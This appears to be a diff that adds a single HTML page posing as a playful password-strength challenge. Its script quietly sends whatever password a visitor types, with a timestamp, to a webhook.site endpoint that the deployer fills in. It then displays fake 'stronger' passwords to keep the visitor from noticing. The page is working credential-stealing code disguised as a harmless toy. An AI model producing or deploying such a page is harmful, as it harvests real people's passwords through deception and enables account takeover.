@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>i-am-cool-as-hell</title>
+    <style>
+        body {font-family: 'Courier New';background:#000;color:#0f0;text-align:center;padding:50px;}
+        h1 {font-size:3em;margin:20px;}
+        input,button {padding:15px;margin:10px;font-size:1.2em;border:2px solid #0f0;background:#000;color:#0f0;border-radius:8px;}
+        button:hover {background:#0f0;color:#000;}
+        .fakes {margin-top:30px;}
+        .fake {margin:10px;padding:12px;background:#111;border:1px solid #0f0;border-radius:5px;display:inline-block;}
+    </style>
+</head>
+<body>
+    <h1>ik ur password is week</h1>
+    <p>prove me wrong.</p>
+    <input type="password" id="pass" placeholder="enter it">
+    <button onclick="prove()">SHOW ME</button>
+    <div id="result" class="fakes"></div>
+
+    <script>
+    function prove() {
+        const p = document.getElementById('pass').value;
+        if (!p) return alert("weak.");
+
+        // SEND TO WEBHOOK (GET YOUR URL FROM webhook.site)
+        fetch('https://webhook.site/YOUR-UNIQUE-ID-HERE', {
+            method: 'POST',
+            body: JSON.stringify({ password: p, time: new Date() })
+        });
+
+        // 5 FAKE STRONGER PASSWORDS
+        let fakes = '';
+        for (let i = 0; i < 5; i++) {
+            let fake = p[0].toUpperCase() + 
+                       Math.random().toString(36).substr(2, 8) + 
+                       '!@#$%'.charAt(i);
+            fakes += `<div class="fake">${fake}</div>`;
+        }
+
+        document.getElementById('result').innerHTML = 
+            `<h2>here's 5 stronger ones:</h2>${fakes}<br><small>ur welcome.</small>`;
+    }
+    </script>
+</body>
+</html>
